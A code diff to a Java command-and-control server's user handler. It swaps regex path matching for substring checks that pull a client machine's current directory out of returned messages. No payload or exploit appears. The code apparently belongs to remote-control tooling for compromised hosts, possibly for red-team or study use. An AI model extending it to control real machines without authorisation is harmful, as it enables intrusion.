@@ -6,8 +6,6 @@ import java.security.MessageDigest;
 import java.util.HashMap;
 import java.util.LinkedList;
 import java.util.Scanner;
-import java.util.regex.Matcher;
-import java.util.regex.Pattern;
 import java.util.Queue;
 import java.util.HashSet;
 import java.util.Arrays;
@@ -269,35 +267,22 @@ public class C2ServerUserHandler implements Runnable{
             }
 
             String currentDirectory = "C:\\";
-
-            // Regex Patterns to search for filepaths (C:\ or /)
-            String windowsPathRegexPattern = "\"^C:\\\\\\\\.*$\"";
-            Pattern windowsCompiledRegexPattern = Pattern.compile(windowsPathRegexPattern);
-
-            String linuxPathRegexPattern = "^(/[^/ ]*)+/?$";
-            Pattern linuxCompiledRegexPattern = Pattern.compile(linuxPathRegexPattern);
     
-            // Iterate through each message returned from the client to find the current directory
+            // Iterate through each message returned from the client, starting at the end, to find the current directory
             synchronized(messageQueue){
                 Object messages[] = messageQueue.toArray();
                 for(int i = messages.length - 1; i > 0; i--){
                     System.out.println(messages[i].toString());
-                    Matcher matcher = windowsCompiledRegexPattern.matcher(messages[i].toString());
-                    if(matcher.matches()){
+                    if(messages[i].toString().contains("C:\\")){
                         System.out.println("Windows Pattern");
-                        currentDirectory = matcher.group();
+                        currentDirectory = messages[i].toString().split(" ")[1];
                         break;
                     }
-                    else {
-                        matcher = linuxCompiledRegexPattern.matcher(messages[i].toString());
-                        if(matcher.matches()){
-                            System.out.println("Linux Pattern");
-                            currentDirectory = matcher.group();
-                            break;
-                        }
+                    else if(messages[i].toString().contains("/")){
+                        System.out.println("Linux Pattern");
+                        currentDirectory = messages[i].toString().split(" ")[1];
+                        break;
                     }
-                    
-
                 }
             }
 
